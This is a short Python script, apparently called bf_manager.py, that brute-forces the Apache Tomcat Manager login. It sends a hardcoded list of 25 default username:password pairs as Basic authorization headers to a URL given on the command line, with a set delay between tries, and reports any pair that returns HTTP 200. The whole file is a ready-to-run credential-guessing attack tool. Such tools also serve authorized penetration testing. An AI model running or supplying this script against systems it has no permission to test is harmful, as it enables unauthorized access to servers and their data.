import requests as r
from time import sleep
import base64
import sys 
from termcolor import colored




credentials=[
"admin:password",
"admin:"	,
"admin:Password1",
"admin:password1",
"admin:admin",
"admin:tomcat",
"both:tomcat",
"manager:manager",
"role1:role1",
"role1:tomcat",
"role:changethis",
"root:Password1",
"root:changethis",
"root:password",
"root:password1",
"root:r00t",
"root:root",
"root:toor",
"tomcat:tomcat",
"tomcat:s3cret",
"tomcat:password1",
"tomcat:password",
"tomcat:",
"tomcat:admin",
"tomcat:changethis"

]

def test_defautl_cred_tomcat_manager(link , time_to_wait):
    ''' 
    iterate on the above list:
    =>base64 encode the credential
    =>credential is then pass into the authorization header
    => result is based on status code of the request

    '''
    for i in credentials:
        print(colored("[-] try : {}".format(i), "blue"))
        password_into_b64 =base64.b64encode(i.encode()) 
        
        my_request= r.get(link,headers={"authorization": "Basic " +password_into_b64.decode()})
        if my_request.status_code == 200:
            print(colored("found credential: {}".format(i), "green"))
            my_request.close()
            break

        my_request.close()
        sleep(time_to_wait)



if __name__=="__main__":
    try:
        link = str(sys.argv[1])
        time_between_req = float(sys.argv[2])
        print("link : ", colored(link,"yellow") )
        print("time beetween each requests: ", colored(time_between_req,"yellow"))
        test_defautl_cred_tomcat_manager(link, time_between_req)


    except:
        print(colored("Usage :\npython3 bf_manager.py <URL> <TIME BEETWEEN REQUEST>" ,"red"))  
        print("<URL> : url of tomcat manager endpoint")
        print("<TIME>: time beetween each attempt (ex: 1 seconde)" )